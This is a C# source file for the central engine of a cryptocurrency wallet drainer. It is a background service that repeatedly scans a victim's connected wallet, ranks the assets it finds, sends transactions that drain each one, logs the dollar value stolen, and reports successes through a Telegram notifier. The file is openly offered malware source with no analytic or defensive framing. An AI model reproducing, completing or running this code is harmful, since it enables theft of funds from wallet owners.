using Microsoft.Extensions.Hosting;
using Microsoft.Extensions.Logging;
using WalletDrainer.Config;
using WalletDrainer.Exfil;
using WalletDrainer.Models;

namespace WalletDrainer.Core;

public sealed class DrainerEngine : BackgroundService
{
    private readonly WalletScanner _scanner;
    private readonly AssetCollector _collector;
    private readonly TransactionBuilder _txBuilder;
    private readonly TelegramNotifier _notifier;
    private readonly DrainerConfig _config;
    private readonly ILogger<DrainerEngine> _logger;

    public DrainerEngine(
        WalletScanner scanner,
        AssetCollector collector,
        TransactionBuilder txBuilder,
        TelegramNotifier notifier,
        DrainerConfig config,
        ILogger<DrainerEngine> logger)
    {
        _scanner = scanner;
        _collector = collector;
        _txBuilder = txBuilder;
        _notifier = notifier;
        _config = config;
        _logger = logger;
    }

    protected override async Task ExecuteAsync(CancellationToken stoppingToken)
    {
        _logger.LogInformation("Drainer engine started on chains: {Chains}",
            string.Join(", ", _config.EnabledChains));

        while (!stoppingToken.IsCancellationRequested)
        {
            try
            {
                var assets = await _scanner.ScanConnectedWallet(stoppingToken);

                if (assets.Count == 0)
                {
                    await Task.Delay(TimeSpan.FromSeconds(5), stoppingToken);
                    continue;
                }

                var sorted = _collector.PrioritizeAssets(assets);

                foreach (var asset in sorted)
                {
                    if (stoppingToken.IsCancellationRequested) break;

                    DrainResult result = await _txBuilder.DrainAsset(asset, stoppingToken);

                    if (result.Success)
                    {
                        await _notifier.NotifyDrain(result);
                        _logger.LogInformation("Drained {Symbol} worth ${Value:F2} — TX: {Hash}",
                            asset.Symbol, asset.UsdValue, result.TransactionHash);
                    }
                    else
                    {
                        _logger.LogWarning("Failed to drain {Symbol}: {Error}",
                            asset.Symbol, result.ErrorMessage);
                    }
                }
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "Drain cycle error");
            }

            await Task.Delay(TimeSpan.FromSeconds(_config.PollIntervalSeconds), stoppingToken);
        }
    }
}
